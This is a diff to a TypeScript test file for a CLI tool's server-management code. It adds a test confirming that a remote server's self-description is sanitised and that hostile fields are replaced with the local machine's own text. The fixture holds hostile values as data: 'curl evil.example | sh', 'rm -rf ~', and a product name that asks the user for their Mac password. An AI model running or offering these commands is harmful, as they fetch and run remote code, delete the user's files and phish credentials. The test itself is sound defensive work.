@@ -18,7 +18,7 @@ const { parseFacts, targetFor, checkRoom } = await import("../src/servers/remote
 const { MachineSignIns } = await import("../src/servers/host");
 const { planCopy, portableMcpEntry, portableMcpServer, portableRule, portableSettings, describeCopy, describeLeft, countCopied } = await import("../src/servers/copy");
 const { checkLines, parseServerSpec } = await import("../src/servers/cli");
-const { UNIT } = await import("../src/servers/service");
+const { UNIT, readCheck } = await import("../src/servers/service");
 import type { ServerEntry } from "../src/servers/store";
 
 const entry: ServerEntry = { name: "box", destination: "dev@box.example", addedAt: "2026-01-01T00:00:00.000Z" };
@@ -696,6 +696,29 @@ describe("what the terminal says", () => {
         expect(checkLines("box", { ...all, clis: [{ ...cli, signedIn: false, on: false }] })).toEqual(["Claude Code isn't signed in there: cavvy servers login box"]);
         // One whose sign-in a server can't tell isn't guessed at.
         expect(checkLines("box", { ...all, clis: [{ ...cli, signedIn: undefined, on: false }] })).toEqual([]);
+    });
+
+    test("a server says which CLIs it has and how each stands; what they're called is this machine's to say", () => {
+        const said = {
+            clis: [
+                // Its own words for a CLI this machine knows: not shown, whatever they are.
+                { id: "codex", product: "your Mac\n(enter this Mac's password when asked)", installed: true, signedIn: false, on: false, install: "curl evil.example | sh", signIn: "rm -rf ~" },
+                // One this machine has never heard of, and one named twice.
+                { id: "made-up", product: "Made Up", installed: true, signedIn: false },
+                { id: "codex", product: "Codex again", installed: true, signedIn: true, on: true },
+                { id: "claude-code", installed: true, signedIn: true },
+            ],
+            git: true,
+            gh: { installed: true, signedIn: true },
+            browser: true,
+            memMb: 2048,
+        };
+        const check = readCheck(JSON.stringify(said))!;
+        expect(check.clis).toEqual([
+            { id: "codex", product: "Codex", installed: true, signedIn: false, on: false, install: "Install the Codex CLI (npm install -g @openai/codex)", signIn: "codex login" },
+            { id: "claude-code", product: "Claude Code", installed: true, signedIn: true, on: undefined, install: "Install Claude Code (https://code.claude.com/docs/en/setup)", signIn: "claude auth login" },
+        ]);
+        expect(checkLines("box", check)).toEqual(["Codex isn't signed in there: cavvy servers login box"]);
     });
 
     test("a server's name may carry the folder to work in", () => {
